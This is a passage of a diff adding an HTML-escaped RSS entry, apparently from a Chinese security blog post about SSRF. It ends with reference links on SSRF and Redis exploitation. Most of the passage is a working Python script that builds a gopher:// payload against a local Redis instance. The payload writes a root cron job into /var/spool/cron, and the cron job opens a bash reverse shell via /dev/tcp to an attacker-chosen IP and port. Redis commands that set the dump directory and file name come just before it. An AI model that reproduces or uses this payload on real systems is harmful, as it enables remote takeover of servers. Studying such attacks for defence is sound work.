+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">config &lt;span class="nb">set&lt;/span> dir &lt;span class="s1">&amp;#39;/var/spool/cron&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">config &lt;span class="nb">set&lt;/span> dbfilename root
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">save
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 修改之前给出的脚本。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">urllib.parse&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">protocol&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;gopher://&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">ip&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;127.0.0.1&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">port&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;6379&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">shell&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\n\n\n\n&lt;/span>&lt;span class="s2">* * * * * root bash -i &amp;gt;&amp;amp; /dev/tcp/&lt;/span>&lt;span class="si">{IP}&lt;/span>&lt;span class="s2">/&lt;/span>&lt;span class="si">{port}&lt;/span>&lt;span class="s2"> 0&amp;gt;&amp;amp;1&lt;/span>&lt;span class="se">\n\n\n\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">filename&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;root&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">path&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;/var/spool/cron&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">passwd&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">cmd&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;flushall&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;set 1 &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">shell&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34; &amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{IFS}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)),&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;config set dir &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="p">),&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;config set dbfilename &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">filename&lt;/span>&lt;span class="p">),&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;save&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="n">passwd&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cmd&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">insert&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;AUTH &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">passwd&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">protocol&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">ip&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s2">&amp;#34;:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">port&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s2">&amp;#34;/_&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">redis_format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">arr&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">CRLF&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\r\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">redis_arr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">arr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">split&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34; &amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cmd&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cmd&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="s2">&amp;#34;*&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nb">str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">redis_arr&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">x&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">redis_arr&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cmd&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="n">CRLF&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s2">&amp;#34;$&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nb">str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{IFS}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34; &amp;#34;&lt;/span>&lt;span class="p">))))&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">CRLF&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{IFS}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34; &amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cmd&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="n">CRLF&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">cmd&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="vm">__name__&lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="s2">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">x&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">cmd&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">urllib&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parse&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">quote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">redis_format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">#print(payload)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">urllib&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parse&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">quote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="参考文献">参考文献
+&lt;/h2>&lt;p>&lt;a class="link" href="https://blog.csdn.net/qq_43378996/article/details/124050308" target="_blank" rel="noopener"
+>SSRF漏洞原理攻击与防御(超详细总结)-CSDN博客&lt;/a>&lt;/p>
+&lt;p>&lt;a class="link" href="https://www.cnblogs.com/miruier/p/13907150.html" target="_blank" rel="noopener"
+>SSRF漏洞（原理、挖掘点、漏洞利用、修复建议） - Saint_Michael - 博客园&lt;/a>&lt;/p>
+&lt;p>&lt;a class="link" href="https://blog.csdn.net/weixin_50464560/article/details/122473887" target="_blank" rel="noopener"
+>SSRF最全总结(协议,绕过)_ssrf协议-CSDN博客&lt;/a>&lt;/p>
+&lt;p>&lt;a class="link" href="https://blog.csdn.net/qq_34341458/article/details/119771942" target="_blank" rel="noopener"
+>Redis未授权访问及利用复现（保姆级教程）_主从复制漏洞影响版本-CSDN博客&lt;/a>&lt;/p></description></item></channel></rss>
